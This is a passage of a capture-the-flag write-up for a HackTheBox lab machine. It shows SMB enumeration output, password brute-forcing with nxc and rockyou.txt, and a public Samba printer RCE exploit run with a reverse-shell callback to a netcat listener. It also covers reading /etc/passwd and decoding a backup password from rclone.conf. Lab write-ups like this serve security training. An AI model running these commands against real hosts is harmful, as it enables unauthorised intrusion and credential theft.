+</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        HP-Reception    Printer   Reception printer
+</span></span><span style="display:flex;"><span>        projects        Disk      Hartley Group Project Files
+</span></span><span style="display:flex;"><span>        transfer        Disk      Staff file transfer
+</span></span><span style="display:flex;"><span>        IPC$            IPC       IPC Service <span style="color:#f92672">(</span>Hartley Group Document Services<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+</span></span><span style="display:flex;"><span>Protocol negotiation to server 10.129.27.170 <span style="color:#f92672">(</span><span style="color:#66d9ef">for</span> a protocol between LANMAN1 and NT1<span style="color:#f92672">)</span> failed: NT_STATUS_INVALID_NETWORK_RESPONSE
+</span></span><span style="display:flex;"><span>Unable to connect with SMB1 -- no workgroup available
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Attempting to map shares on 10.129.27.170                 
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> Can<span style="color:#e6db74">&#39;t understand response:                                
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                                              
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">NT_STATUS_NO_SUCH_FILE listing \*                             
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">//10.129.27.170/HP-Reception    Mapping: N/A Listing: N/A Writing: N/A                                                      
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">//10.129.27.170/projects        Mapping: DENIED Listing: N/A Writing: N/A                                                   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">//10.129.27.170/transfer        Mapping: DENIED Listing: N/A Writing: N/A                                                   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[E] Can&#39;</span>t understand response:                                
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>NT_STATUS_CONNECTION_REFUSED listing <span style="color:#ae81ff">\*</span>                       
+</span></span><span style="display:flex;"><span>//10.129.27.170/IPC$    Mapping: N/A Listing: N/A Writing: N/A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">===========================(</span> Password Policy Information <span style="color:#66d9ef">for</span> 10.129.27.170 <span style="color:#f92672">)===========================</span>                    
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Attaching to 10.129.27.170 using a NULL share
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Trying protocol 139/SMB...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found domain<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ABDUCTED
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Builtin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password Info <span style="color:#66d9ef">for</span> Domain: ABDUCTED
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Minimum password length: <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password history length: None
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Maximum password age: <span style="color:#ae81ff">37</span> days <span style="color:#ae81ff">6</span> hours <span style="color:#ae81ff">21</span> minutes 
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password Complexity Flags: <span style="color:#ae81ff">000000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain Refuse Password Change: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain Password Store Cleartext: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain Password Lockout Admins: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain Password No Clear Change: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain Password No Anon Change: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain Password Complex: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Minimum password age: None
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Reset Account Lockout Counter: <span style="color:#ae81ff">30</span> minutes 
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Locked Account Duration: <span style="color:#ae81ff">30</span> minutes 
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Account Lockout Threshold: None
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Forced Log off Time: <span style="color:#ae81ff">37</span> days <span style="color:#ae81ff">6</span> hours <span style="color:#ae81ff">21</span> minutes 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retieved partial password policy with rpcclient:          
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>Password Complexity: Disabled                                 
+</span></span><span style="display:flex;"><span>Minimum Password Length: 5
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">======================================(</span> Groups on 10.129.27.170 <span style="color:#f92672">)======================================</span>                    
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Getting builtin groups:                                   
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>  Getting builtin group memberships:                       
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>  Getting local groups:                                    
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>  Getting local group memberships:                         
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>  Getting domain groups:                                   
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>  Getting domain group memberships:                        
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">==================(</span> Users on 10.129.27.170 via RID cycling <span style="color:#f92672">(</span>RIDS: 500-550,1000-1050<span style="color:#f92672">)</span> <span style="color:#f92672">)==================</span>                   
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> Found new SID:                                            
+</span></span><span style="display:flex;"><span>S-1-22-1                                                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> Found new SID:                                            
+</span></span><span style="display:flex;"><span>S-1-5-32                                                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> Found new SID:                                            
+</span></span><span style="display:flex;"><span>S-1-5-32                                                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> Found new SID:                                            
+</span></span><span style="display:flex;"><span>S-1-5-32                                                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> Found new SID:                                            
+</span></span><span style="display:flex;"><span>S-1-5-32                                                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating users using SID S-1-22-1 and logon username <span style="color:#e6db74">&#39;&#39;</span>, password <span style="color:#e6db74">&#39;&#39;</span>                                                 
+</span></span><span style="display:flex;"><span>                                                              
+</span></span><span style="display:flex;"><span>S-1-22-1-1000 Unix User<span style="color:#ae81ff">\s</span>cott <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                    
+</span></span><span style="display:flex;"><span>S-1-22-1-1001 Unix User<span style="color:#ae81ff">\m</span>arcus <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span></span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>(Apologies for the long output, I went ahead and cut off some of the unimportant stuff)<br>
+ <br>
+The enumeration scan revealed the <strong>SMB shares</strong> on the machine, as well as the users! The shares it found were <strong>HP-Reception</strong>, <strong>projects</strong>, <strong>transfer</strong>, and <strong>IPC$</strong>. My first instinct was to begin brute-forcing into the shares from <em>both</em> users so that&rsquo;s exactly what I did.</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.129.27.170 -u scott -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.129.27.170 -u marcus -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>For the <strong>scott</strong> user, I went ahead and let my brute-force attempt run for about half an hour, but decided to stop it since it didn&rsquo;t look like it was getting anywhere. The <strong>marcus</strong> user would successfully log in no matter what the password was, given that it was a <strong>Guest</strong> account. Trying to access the <strong>projects</strong> or <strong>transfer</strong> share using the <strong>marcus</strong> account wouldn&rsquo;t give me access. So, I tried to switch my attack angle.<br>
+ <br>
+Instead of focusing on the two <strong>disk</strong> shares (<strong>projects</strong> and <strong>transfer</strong>), I took a look into the <strong>printer</strong> share, <strong>HP-Reception</strong>. I accessed it using <strong>marcus</strong>&rsquo;s guest account:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# smbclient //10.129.27.170/HP-Reception -U marcus%       
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Checking the print queue for any print jobs I could extract came up short, and I wasn&rsquo;t able to run <strong>posix</strong> to execute UNIX commands. I racked my brain for a bit and began to think, if I was able to access the printer as <strong>marcus</strong>, which was a <em>Guest</em> account, that means the printer could be accessed by anyone!<br>
+ <br>
+This was a big realization because it meant that <em>any unauthenticated user</em> on the network could send a print job to the printer. I felt like this could lead to a foothold on the machine, but I wasn&rsquo;t familiar with exploiting smb printers to pop a shell. So, I did some digging online.<br>
+ <br>
+I ended up coming across <strong>CVE-2026-4480</strong>, a recently found vulnerability within the Samba printing subsystem. Essentially, it allows for <strong>remote code execution</strong> through unauthenticated users sending malicious print jobs. All an attacker has to do is modify the document they send to the printer to include <strong>&quot;|sh&quot;</strong> in the job description along with a payload, which gets parsed into code that the host will run. More information about the vulnerability can be found <a href="https://www.sentinelone.com/vulnerability-database/cve-2026-4480/"><strong>here</strong></a>.<br>
+ <br>
+A PoC has already been created for this vulnerability, which already comes configured to pop a reverse shell. The Python script to run it can be found on <strong>TheCyberGeek</strong>&rsquo;s GitHub (<a href="https://github.com/TheCyberGeek/CVE-2026-4480-PoC"><strong>here</strong></a>&rsquo;s a link to that if you&rsquo;d like to check it out!)<br>
+ <br>
+I went ahead and downloaded the exploit, installed the dependencies required, set up a listener, and ran it on my attacker machine:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Setting up a listener</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Running the exploit</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# python3 exploit.py 10.129.27.170 10.10.16.192 <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> target   : 10.129.27.170 <span style="color:#f92672">(</span><span style="color:#ae81ff">\\</span>10.129.27.170<span style="color:#ae81ff">\H</span>P-Reception<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> callback : 10.10.16.192:4444  <span style="color:#f92672">(</span>start a listener first: nc -lvnp 4444<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> print job submitted -- check your listener / out-of-band channel</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Now, just gotta check our listener to see if we got a-</p>
+<h2 id="foothold" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>FOOTHOLD</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Success! Shell has been caught</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.192<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.27.170<span style="color:#f92672">]</span> <span style="color:#ae81ff">52264</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>2294<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>nobody@abducted:/var/spool/samba$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nobody</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I cleaned up the shell to look all nice and pretty and got straight to enumerating again. I was able to print the <strong>/etc/passwd</strong> file which allowed me to see what users existed on the machine:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nobody@abducted:/var/spool/samba$ cat /etc/passwd | grep bash
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash
+</span></span><span style="display:flex;"><span>marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The machine had the same two users, <strong>marcus</strong> and <strong>scott</strong>. As you can tell by the code above, I was running as the user <strong>nobody</strong>. This user is pretty <em>low-privileged</em>, and has no login by default, so I wasn&rsquo;t expecting any SUID binaries or capabilities. What I was <em>really</em> interested in was finding any configuration files, credentials, or scripts that I could run.<br>
+ <br>
+It didn&rsquo;t take too much time to find the <strong>/opt/offsite-backup</strong> directory, which contained two very interesting files:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nobody@abducted:/opt/offsite-backup$ ls
+</span></span><span style="display:flex;"><span>rclone.conf  sync.sh</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The <strong>sync.sh</strong> file revealed the location of the <strong>smb</strong> shares on the local machine:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nobody@abducted:/opt/offsite-backup$ cat sync.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Trying to access the <strong>projects</strong> share as the <strong>nobody</strong> user left me with a &ldquo;permission denied&rdquo; message. I <em>was</em> able to read the <strong>transfers</strong> share, though, it was empty&hellip; But I <em>really</em> struck gold with the <strong>rclone.conf</strong> file as it contained some old credentials:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nobody@abducted:/opt/offsite-backup$ cat rclone.conf 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>offsite<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>type <span style="color:#f92672">=</span> sftp
+</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> backup.hartley-group.internal
+</span></span><span style="display:flex;"><span>user <span style="color:#f92672">=</span> svc-backup
+</span></span><span style="display:flex;"><span>pass <span style="color:#f92672">=</span> HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
+</span></span><span style="display:flex;"><span>shell_type <span style="color:#f92672">=</span> unix</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I took the password from the configuration file and used the <strong>rclone reveal</strong> command to retrieve it:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nobody@abducted:/opt/offsite-backup$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
+</span></span><span style="display:flex;"><span>iXzvcib3SrpZ</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
